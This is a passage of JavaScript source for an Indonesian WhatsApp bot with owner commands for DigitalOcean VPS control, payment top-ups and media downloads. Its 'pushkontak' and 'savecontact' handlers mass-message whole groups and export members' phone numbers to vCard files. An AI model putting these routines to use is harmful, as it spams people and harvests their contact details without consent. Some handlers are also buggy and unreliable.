*SIMPAN DATA VPS ANDA DENGAN BAIK JIKA INGIN DAPAT GARANSI WAJIB BAWA DATA VPS + BUKTI TRX TERIMAKASIH😁✌🏻*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY IP VPS\",\"id\":\"123456789\",\"copy_code\":\"${ipVPS}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY PW VPS\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
} else {
return new Error(`Gagal membuat VPS: ${responseData.message}`);
}
} catch (err) {
console.err(err);
reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
}}
break

case 'turnon': {
if (!isOwner) return onlyOwn()
let dropletId = args[0];
if (!dropletId) return reply('ID droplet belum diberikan!');
async function turnOnDroplet() {
try {
const response = await axios.post(
`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
{
type: 'power_on',
},
{
headers: {
'Content-Type': 'application/json',
Authorization: `Bearer ${apido}`,
},
}
);

if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
reply('VPS (droplet) sedang dihidupkan...');
} else {
reply('Gagal menghidupkan VPS (droplet).');
}
} catch (err) {
reply('Terjadi kesalahan saat menghidupkan VPS (droplet):', err);
}
}
turnOnDroplet();
break;
}

case 'turnoff': {
if (!isOwner) return onlyOwn()
let dropletId = args[0];
if (!dropletId) return reply('ID droplet belum diberikan!');

async function turnOffDroplet() {
try {
const response = await axios.post(
`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
{
type: 'power_off',
},
{
headers: {
'Content-Type': 'application/json',
Authorization: `Bearer ${apido}`,
},
}
);

if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
reply('VPS (droplet) sedang dimatikan...');
} else {
reply('Gagal mematikan VPS (droplet).');
}
} catch (err) {
reply('Terjadi kesalahan saat mematikan VPS (droplet):', err);
}}
turnOffDroplet();
break;
}

case 'restartvps': {
if (!isOwner) return onlyOwn()
let dropletId = args[0];
if (!dropletId) return reply('ID droplet belum diberikan!');
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${apido}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
reply('Terjadi kesalahan saat melakukan restart VPS:', err);
}
};

restartVPS(dropletId)
.then((action) => {
reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
reply(err);
});
break;
}

case 'rebuild': {
if (!isOwner) return onlyOwn()
let dropletId = args[0];
if (!dropletId) return reply('ID droplet belum diberikan!');
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${apido}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${apido}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
rafatharcode.sendMessage(m.chat, { text: textvps });
} else {
reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
reply('Gagal melakukan rebuild VPS:', errorData.message);
}
} catch (err) {
reply('Terjadi kesalahan saat melakukan rebuild VPS:', err);
}};
rebuildVPS();
}
break;

case 'sendvps': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} 628xxx,ip,ram,harga,password`)
edit3("Mengirim pesanan...", "Proses hampir selesai", "Sukses mengirim pesanan!") 
var mon = args.join(' ')
var m1 = mon.split(",")[0]
var m2 = mon.split(",")[1]
var m3 = mon.split(",")[2]
var m4 = mon.split(",")[3]
var m5 = mon.split(",")[4]
let mq1 = m1 + '@s.whatsapp.net'
let ownernya = owner + '@s.whatsapp.net'
let me = m.sender
let ments = [mq1, ownernya, me]
rafatharcode.sendMessage(mq1, {text: `*°•——————  ${storename}  ——————•°*

*📦 PESANAN MU DATANG 📦*
Harga: ${m4}
Username: Root
Password: ${m5}
Ram: ${m3}

*°•——————  TOS VPS  ——————•°*

- Jgn sampai kena ddos
- Cpu jgn sampai 120%+
- Panel sus no reff
Melanggar? garansi angus! `}, m) 
}
break

// === Push Menu

case 'pushkontak': {
if (!isOwner) return onlyOwn()
if (!m.isGroup) return onlyGrup()
if (!text) return m.reply(`Mana teksnya?`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
m.reply(`Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 8} detik`)
for (let geek of mem) {
await sleep(5000) // Jedanya
rafatharcode.sendMessage(geek, {text: `${teksnye}`}, {quoted:m})
}
await loading()
m.reply(`Sukses mengirim pesan Ke ${mem.length} orang`)
}
break

case 'pushkontak2': {
if (!isOwner) return onlyOwn()
let idgc = text.split("|")[0]
let pesan = text.split("|")[1]
if (!idgc && !pesan) return m.reply(`Contoh: ${prefix+command} idgc|pesan`)
let metaDATA = await rafatharcode.groupMetadata(idgc).catch((e) => m.reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
let count = getDATA.length;
let sentCount = 0;
m.reply(`Sedang Push ID...\nMengirim pesan ke ${getDATA.length} orang, waktu selesai ${getDATA.length * 8} detik`)
for (let i = 0; i < getDATA.length; i++) {
setTimeout(function() {
rafatharcode.sendMessage(getDATA[i], { text: pesan });
count--;
sentCount++;
if (count === 0) {
m.reply(`Semua pesan telah dikirim!\nJumlah pesan terkirim: ${sentCount}`);
}}, i * 7000); // Jedanya
}}
break

case 'pushkontakid': {
if (!isOwner) return onlyOwn()
if (!isPc) return onlyPrivat()
if (!text) return m.reply(`Contoh: ${prefix+command} idgroup|teks`)
await loading()
const groupMetadataa = !m.isGroup? await rafatharcode.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
const participants = !m.isGroup? await groupMetadataa.participants : ""
const lalu = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of lalu) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./data/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await rafatharcode.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await rafatharcode.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(3000)
} else {
await rafatharcode.sendMessage(mem, { text: global.tekspushkon })
await sleep(3000)
}}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:thomz[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./data/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await rafatharcode.sendMessage(from, { document: fs.readFileSync("./data/contacts.vcf"), fileName: "contacts.vcf", caption: "Pencet file di atas lalu save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./data/contacts.json", JSON.stringify(contacts))
}
}
break

case 'pushkontakgc': {
if (!isOwner) return onlyOwn()
if (!m.isGroup) return onlyGrup()
if (!text) return m.reply(`Contoh: ${prefix+command} teks`)
await loading()
const groupMetadata = m.isGroup? await rafatharcode.groupMetadata(from).catch(e => {}) : ""
const groupOwner = m.isGroup? groupMetadata.owner : ""
const participantts = m.isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv2 = text
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./data/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await rafatharcode.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await rafatharcode.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(3000)
} else {
await rafatharcode.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(3000)
}}
m.reply('File kontak sudah di kirim lewat chat pribadi!')
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:thomz[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./data/contacts.vcf", vcardContent, "utf8");
} catch (err) {
m.reply(util.format(err))
} finally {
await rafatharcode.sendMessage(m.sender, { document: fs.readFileSync("./data/contacts.vcf"), fileName: "contacts.vcf", caption: "Pencet file di atas lalu save", mimetype: "text/vcard", }, {quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./data/contacts.json", JSON.stringify(contacts))
}
}
break

case 'pushkontakidjd': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} idgroup|jeda|Teks`)
await loading()
const groupMetadataa = !m.isGroup? await rafatharcode.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !m.isGroup? await groupMetadataa.participants : ""
const lalu = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of lalu) {
if (/image/.test(mime)) {
media = await rafatharcode.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await rafatharcode.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
await sleep(q.split("|")[1])
} else {
await rafatharcode.sendMessage(mem, { text: global.tekspushkonv3 })
await sleep(q.split("|")[1])
}}
m.reply('Berhasil pushkontak!')
}
break

case 'pushkontakgcjd': {
if (!isOwner) return onlyOwn()
if (!isGroup) return onlyGrup()
if (!text) return m.reply(`Contoh: ${prefix+command} jeda|teks`)
await loading()
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await rafatharcode.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await rafatharcode.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
await sleep(text.split("|")[0])
} else {
await rafatharcode.sendMessage(men, { text: tekspushkonv4 })
await sleep(text.split("|")[0])
}}
m.reply('Berhasil pushkontak!')
}
break

case 'savecontact': {
if (!isOwner) return onlyGrup()
if (!text) return m.reply(`Contoh: ${prefix+command} idgrup`)
rafatharcode.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
const groupMetadataa = !isGroup? await rafatharcode.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const lalu = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of lalu) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./data/contacts.json', JSON.stringify(contacts))}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./data/contacts.vcf", vcardContent, "utf8");
} catch (err) {
m.reply(util.format(err))
} finally {
await rafatharcode.sendMessage(from, { document: fs.readFileSync("./data/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses, tinggal save ya kak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./data/contacts.json", JSON.stringify(contacts))
}}
break

case 'savecontact2': {
if (!isOwner) return onlyOwn()
if (!m.isGroup) return onlyGrup()
rafatharcode.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
const groupmetadata = isGroup? await rafatharcode.groupMetadata(from).catch(e => {}) : ""
const groupCreator = isGroup? groupmetadata.Creator : ""
const participantts = isGroup? await groupmetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (isContacts) return
contacts.push(men)
fs.writeFileSync('./data/contacts.json', JSON.stringify(contacts))
}
m.reply("Sukses, file sudah dikirim lewat privat chat")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:${pushname}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./data/contacts.vcf", vcardContent, "utf8");
} catch (err) {
m.reply(util.format(err))
} finally {
await rafatharcode.sendMessage(senderr, { document: fs.readFileSync("./data/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses, tinggal save ya kak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./data/contacts.json", JSON.stringify(contacts))
}}
break

case 'save': {
if (!isOwner) return onlyOwn()
let q = text.split('|');
if (q.length < 2) return m.reply(`Contoh: ${prefix+command} nama|nomer`)
let users = m.mentionedJid[1] ? m.mentionedJid[1] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
let name = q[0];
let phoneNumber = users.replace(/[^0-9]/g, '');
if (phoneNumber.length === 11 && phoneNumber.startsWith('0')) {
phoneNumber = '' + phoneNumber.substr(1);
} else if (phoneNumber.length === 12 && phoneNumber.startsWith('00')) {
phoneNumber = phoneNumber.substr(2);
} else if (phoneNumber.length === 13 && phoneNumber.startsWith('+')) {
phoneNumber = phoneNumber.substr(1);
} else if (phoneNumber.length === 10) {
phoneNumber = '' + phoneNumber;
}
phoneNumber = '' + phoneNumber;
const uniqueContacts = [phoneNumber];
let vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\nTEL;type=CELL;type=VOICE;waid=${uniqueContacts}:+${uniqueContacts}\nEND:VCARD`
await rafatharcode.sendMessage(m.chat, { contacts: { displayName: name, contacts: [{ vcard }] }}, { quoted: m })
m.reply(`Berhasil save nomor kamu, Svb ${ownername}`)
  }
break

case 'cekidgc': {
if (!isOwner) return onlyOwn()
let getGroups = await rafatharcode.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `${monospace("LIST  GRUP")}\n\nTotal grup: ${anu.length} Grup\n\n`
for (let x of anu) {
let metadata2 = await rafatharcode.groupMetadata(x)
teks += `- Nama: ${metadata2.subject}\n- ID: ${metadata2.id}\n- Member: ${metadata2.participants.length}\n\n`
}
m.reply(teks)
}
break

// === PPOB Indonesia

case 'topup-dana': {
if (!isOwner) return onlyOwn()
let [nomor, total] = text.split`|`
if (!text) return m.reply(`Contoh: ${prefix+command} 08xx|10000`)
m.reply('Memproses pembayaran...')
try {
let res = await fetchJson(`https://api.neoxr.eu/api/topup-dana?number=${encodeURIComponent(nomor ? nomor : '')}&amount=${encodeURIComponent(total ? total : '')}&apikey=${neoxrapi}`)
if (res.status && res.data) {
let hasil = res.data
let buffer = Buffer.from(hasil.qr_image, 'base64')
await rafatharcode.sendMessage(m.chat, { image: buffer, caption: `ID Transaksi: ${hasil.id}\nNomor: ${hasil.number}\nJumlah total: ${hasil.price_format}\nKadaluwarsa pada: ${hasil.expired_at}` }, { quoted: m })
}
} catch (err) {
console.log(err)
m.reply('Terjadi kesalahan saat menproses pembayaran')
}
}
break

case 'topup-gopay': {
if (!isOwner) return onlyOwn()
let [nomor, total] = text.split`|`
if (!text) return m.reply(`Contoh: ${prefix+command} 08xx|10000`)
m.reply('Memproses pembayaran...')
try {
let res = await fetchJson(`https://api.neoxr.eu/api/topup-gopay?number=${encodeURIComponent(nomor ? nomor : '')}&amount=${encodeURIComponent(total ? total : '')}&apikey=${neoxrapi}`)
if (res.status && res.data) {
let hasil = res.data
let buffer = Buffer.from(hasil.qr_image, 'base64')
await rafatharcode.sendMessage(m.chat, { image: buffer, caption: `ID Transaksi: ${hasil.id}\nNomor: ${hasil.number}\nJumlah total: ${hasil.price_format}\nKadaluwarsa pada: ${hasil.expired_at}` }, { quoted: m })
}
} catch (err) {
console.log(err)
m.reply('Terjadi kesalahan saat menproses pembayaran')
}
}
break

case 'topup-ovo': {
if (!isOwner) return onlyOwn()
let [nomor, total] = text.split`|`
if (!text) return m.reply(`Contoh: ${prefix+command} 08xx|10000`)
m.reply('Memproses pembayaran...')
try {
let res = await fetchJson(`https://api.neoxr.eu/api/topup-ovo?number=${encodeURIComponent(nomor ? nomor : '')}&amount=${encodeURIComponent(total ? total : '')}&apikey=${neoxrapi}`)
if (res.status && res.data) {
let hasil = res.data
let buffer = Buffer.from(hasil.qr_image, 'base64')
await rafatharcode.sendMessage(m.chat, { image: buffer, caption: `ID Transaksi: ${hasil.id}\nNomor: ${hasil.number}\nJumlah total: ${hasil.price_format}\nKedaluwarsa pada: ${hasil.expired_at}` }, { quoted: m })
}
} catch (err) {
console.log(err)
m.reply('Terjadi kesalahan saat memproses pembayaran')
}
}
break

case 'pulsa-axis': {
if (!isOwner) return onlyOwn()
let [nomor, total] = text.split`|`
if (!text) return m.reply(`Contoh: ${prefix+command} 08xx|10000`)
m.reply('Memproses pembayaran...')
try {
let res = await fetchJson(`https://api.neoxr.eu/api/pulsa-axis?number=${encodeURIComponent(nomor ? nomor : '')}&amount=${encodeURIComponent(total ? total : '')}&apikey=${neoxrapi}`)
if (res.status && res.data) {
let hasil = res.data
let buffer = Buffer.from(hasil.qr_image, 'base64')
await rafatharcode.sendMessage(m.chat, { image: buffer, caption: `ID Transaksi: ${hasil.id}\nNomor: ${hasil.number}\nJumlah total: ${hasil.price_format}\nKadaluwarsa pada: ${hasil.expired_at}` }, { quoted: m })
}
} catch (err) {
console.log(err)
m.reply('Terjadi kesalahan saat memproses pembayaran')
}
}
break

case 'pulsa-indosat': {
if (!isOwner) return onlyOwn()
let [nomor, total] = text.split`|`
if (!text) return m.reply(`Contoh: ${prefix+command} 08xx|10000`)
m.reply('Memproses pembayaran...')
try {
let res = await fetchJson(`https://api.neoxr.eu/api/pulsa-indosat?number=${encodeURIComponent(nomor ? nomor : '')}&amount=${encodeURIComponent(total ? total : '')}&apikey=${neoxrapi}`)
if (res.status && res.data) {
let hasil = res.data
let buffer = Buffer.from(hasil.qr_image, 'base64')
await rafatharcode.sendMessage(m.chat, { image: buffer, caption: `ID Transaksi: ${hasil.id}\nNomor: ${hasil.number}\nJumlah total: ${hasil.price_format}\nKadaluwarsa pada: ${hasil.expired_at}` }, { quoted: m })
}
} catch (err) {
console.log(err)
m.reply('Terjadi kesalahan saat memproses pembayaran')
}
}
break

case 'pulsa-tsel': {
if (!isOwner) return onlyOwn()
let [nomor, total] = text.split`|`
if (!text) return m.reply(`Contoh: ${prefix+command} 08xx|10000`)
m.reply('Memproses pembayaran...')
try {
let res = await fetchJson(`https://api.neoxr.eu/api/pulsa-telkomsel?number=${encodeURIComponent(nomor ? nomor : '')}&amount=${encodeURIComponent(total ? total : '')}&apikey=${neoxrapi}`)
if (res.status && res.data) {
let hasil = res.data
let buffer = Buffer.from(hasil.qr_image, 'base64')
await rafatharcode.sendMessage(m.chat, { image: buffer, caption: `ID Transaksi: ${hasil.id}\nNomor: ${hasil.number}\nJumlah total: ${hasil.price_format}\nKadaluwarsa pada: ${hasil.expired_at}` }, { quoted: m })
}
} catch (err) {
console.log(err)
m.reply('Terjadi kesalahan saat memproses pembayaran')
}
}
break

case 'pulsa-tri': {
if (!isOwner) return onlyOwn()
let [nomor, total] = text.split`|`
if (!text) return m.reply(`Contoh: ${prefix+command} 08xx|10000`)
m.reply('Memproses pembayaran...')
try {
let res = await fetchJson(`https://api.neoxr.eu/api/pulsa-tri?number=${encodeURIComponent(nomor ? nomor : '')}&amount=${encodeURIComponent(total ? total : '')}&apikey=${neoxrapi}`)
if (res.status && res.data) {
let hasil = res.data
let buffer = Buffer.from(hasil.qr_image, 'base64')
await rafatharcode.sendMessage(m.chat, { image: buffer, caption: `ID Transaksi: ${hasil.id}\nNomor: ${hasil.number}\nJumlah total: ${hasil.price_format}\nKadaluwarsa pada: ${hasil.expired_at}` }, { quoted: m })
}
} catch (err) {
console.log(err)
m.reply('Terjadi kesalahan saat memproses pembayaran')
}
}
break

case 'pulsa-xl': {
if (!isOwner) return onlyOwn()
let [nomor, total] = text.split`|`
if (!text) return m.reply(`Contoh: ${prefix+command} 08xx|10000`)
m.reply('Memproses pembayaran...')
try {
let res = await fetchJson(`https://api.neoxr.eu/api/pulsa-xl?number=${encodeURIComponent(nomor ? nomor : '')}&amount=${encodeURIComponent(total ? total : '')}&apikey=${neoxrapi}`)
if (res.status && res.data) {
let hasil = res.data
let buffer = Buffer.from(hasil.qr_image, 'base64')
await rafatharcode.sendMessage(m.chat, { image: buffer, caption: `ID Transaksi: ${hasil.id}\nNomor: ${hasil.number}\nJumlah total: ${hasil.price_format}\nKadaluwarsa pada: ${hasil.expired_at}` }, { quoted: m })
}
} catch (err) {
console.log(err)
m.reply('Terjadi kesalahan saat memproses pembayaran')
}
}
break

case 'tshopeepay': {
if (!isOwner) return onlyOwn()
let [nomor, total] = text.split`|`
if (!text) return m.reply(`Contoh: ${prefix+command} 08xx|10000`)
m.reply('Memproses pembayaran...')
try {
let res = await fetchJson(`https://api.neoxr.eu/api/topup-shopeepay?number=${encodeURIComponent(nomor ? nomor : '')}&amount=${encodeURIComponent(total ? total : '')}&apikey=${neoxrapi}`)
if (res.status && res.data) {
let hasil = res.data
let buffer = Buffer.from(hasil.qr_image, 'base64')
await rafatharcode.sendMessage(m.chat, { image: buffer, caption: `ID Transaksi: ${hasil.id}\nNomor: ${hasil.number}\nJumlah total: ${hasil.price_format}\nKadaluwarsa pada: ${hasil.expired_at}` }, { quoted: m })
}
} catch (err) {
console.log(err)
m.reply('Terjadi kesalahan saat memproses pembayaran')
}
}
break

// === Donlod Menu

case 'mfdl':
case 'mediafire': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} linknya`)
if (!text.includes('mediafire.com')) return m.reply('Harus berupa link mediafire!')
await rafatharcode.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
mediafireDl(text).then(async(data) => {
fileNama = decodeURIComponent(data[0].nama)
var media = await getBuffer(data[0].link)
if (data[0].mime.includes('mp4')) {
rafatharcode.sendMessage(m.chat, { document: media, fileName: fileNama, mimetype: 'video/mp4' }, { quoted: m })
} else if (data[0].mime.includes('mp3')) {
rafatharcode.sendMessage(m.chat, { document: media, fileName: fileNama, mimetype: 'audio/mp3' }, { quoted: m })
} else {
rafatharcode.sendMessage(m.chat, { document: media, fileName: fileNama, mimetype: 'application/'+data[0].mime }, { quoted: m })
}
}).catch((e) => {
m.reply('Terjadi kesalahan')
})}
break

case 'tt':
case 'ttdl':
case 'tiktok': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} linknya`)
if (!text.includes('tiktok.com')) return m.reply('Harus berupa link tiktok!')
rafatharcode.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
try {
let jir = await fetchJson(`https://skizo.tech/api/tiktok?apikey=${skizapi}&url=${text}`)
let sil = `${jir.media}`
return await rafatharcode.sendMessage(m.chat, { video: { url: sil }, caption: `© ${wm}` }, { quoted: m })
} catch (err) {
console.error('Kesalahan pada API skizo.tech:', err)
try {
let anu = await Downloader(text, { version: "v2" })
if (anu.result.type === 'video') return await rafatharcode.sendMessage(m.chat, { video: { url: anu.result.video }, caption: `© ${wm}` }, { quoted: m })
if (anu.result.type === 'image') {
let c = 0
for (let imgs of anu.result.images) {
if (c === 0) await rafatharcode.sendMessage(m.chat, { image: { url: imgs }, caption: `© ${wm}\n\n${m.isGroup ? 'Sisa foto dikirim di privat chat' : ""}` }, { quoted: m })
else await rafatharcode.sendMessage(m.sender, { image: { url: imgs }}, { quoted: m })
c += 1
await sleep(2000)
}
}
} catch (err) {
console.error('Kesalahan pada Downloader v2:', err)
try {
let anu = await Downloader(text, { version: "v1" })
if (anu.result.type === 'video') return await rafatharcode.sendMessage(m.chat, { video: { url: anu.result.video.playAddr }, caption: `© ${wm}` }, { quoted: m })
if (anu.result.type === 'image') {
let c = 0
for (let imgs of anu.result.images) {
if (c === 0) await rafatharcode.sendMessage(m.chat, { image: { url: imgs }, caption: `© ${wm}\n\n${m.isGroup ? 'Sisa foto dikirim di privat chat' : ""}` }, { quoted: m })
else await rafatharcode.sendMessage(m.sender, { image: { url: imgs }}, { quoted: m })
c += 1
await sleep(2000)
}
}
} catch (err) {
console.error('Kesalahan pada Downloader v1:', err)
try {
let anu = await Downloader(text, { version: "v3" })
if (anu.result.type === 'video') return await rafatharcode.sendMessage(m.chat, { video: { url: anu.result.video2 }, caption: `© ${wm}` }, { quoted: m })
if (anu.result.type === 'image') {
let c = 0
for (let imgs of anu.result.images) {
if (c === 0) await rafatharcode.sendMessage(m.chat, { image: { url: imgs }, caption: `© ${wm}\n\n${m.isGroup ? 'Sisa foto dikirim di privat chat' : ""}` }, { quoted: m })
else await rafatharcode.sendMessage(m.sender, { image: { url: imgs }}, { quoted: m })
c += 1
await sleep(2000)
}
}
} catch (err) {
console.error('Kesalahan pada Downloader v3:', err)
try {
const data = await tiktokdl(text)
console.log(data)
return await rafatharcode.sendMessage(m.chat, { video: { url: data.video }, caption: `© ${wm}` }, { quoted: m })
} catch (err) {
console.error('Kesalahan pada tiktokdl:', err)
try {
let maximus = await api.ttdl(text)
let caption = `© ${wm}`
return await rafatharcode.sendMessage(m.chat, { video: { url: maximus.video[0] }, caption: caption })
} catch (err) {
console.error('Kesalahan pada api.ttdl:', err)
try {
let anu = await fetchJson(`https://api.vreden.my.id/api/tiktok?url=${text}`)
let c = 0
for (let imgs of anu.result.data) {
if (imgs.type === "nowatermark") {
return await rafatharcode.sendMessage(m.chat, { video: { url: imgs.url }, caption: `© ${wm}` }, { quoted: m })
} else if (imgs.type === "photo") {
if (c === 0) await rafatharcode.sendMessage(m.chat, { image: { url: imgs.url }, caption: `© ${wm}\n\n${m.isGroup ? 'Sisa foto dikirim di private chat' : ""}` }, { quoted: m })
else await rafatharcode.sendMessage(m.sender, { image: { url: imgs.url }}, { quoted: m })
c += 1
await sleep(2000)
}}
} catch (err) {
console.error('Kesalahan pada API vreden:', err)
m.reply('Terjadi kesalahan')
}}}
}}}
}}
break

case 'tiktok-v2':
case 'tt-v2': {
if (!isOwner) return onlyOwn()
if (!text) return rafatharcodereply(`Contoh : ${prefix + command} linknya`)
rafatharcodereply('_Sedang Diproses ⏳_')
let data = await dylux.tiktok(text)
let json = data.result
let caption = `[ TIKTOK - DOWNLOAD ]\n\n`
caption += `◦ *Id* : ${json.id}\n`
caption += `◦ *Username* : ${json.author.nickname}\n`
caption += `◦ *Title* : ${(json.title)}\n`
caption += `◦ *Like* : ${(json.digg_count)}\n`
caption += `◦ *Comments* : ${(json.comment_count)}\n`
caption += `◦ *Share* : ${(json.share_count)}\n`
caption += `◦ *Play* : ${(json.play_count)}\n`
caption += `◦ *Created* : ${json.create_time}\n`
caption += `◦ *Size* : ${json.size}\n`
caption += `◦ *Duration* : ${json.duration}`
if (json.images) {
json.images.forEach(async (k) => {
await rafatharcode.sendMessage(m.chat, { image: { url: k }}, { quoted: m });
})
} else {
rafatharcode.sendMessage(m.chat, { video: { url: json.play }, mimetype: 'video/mp4', caption: caption }, { quoted: m })
setTimeout(() => {
rafatharcode.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mpeg' }, { quoted: m })
}, 3000)
}
}
break

case 'fb':
case 'fbdl':
case 'facebook': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} linknya`)
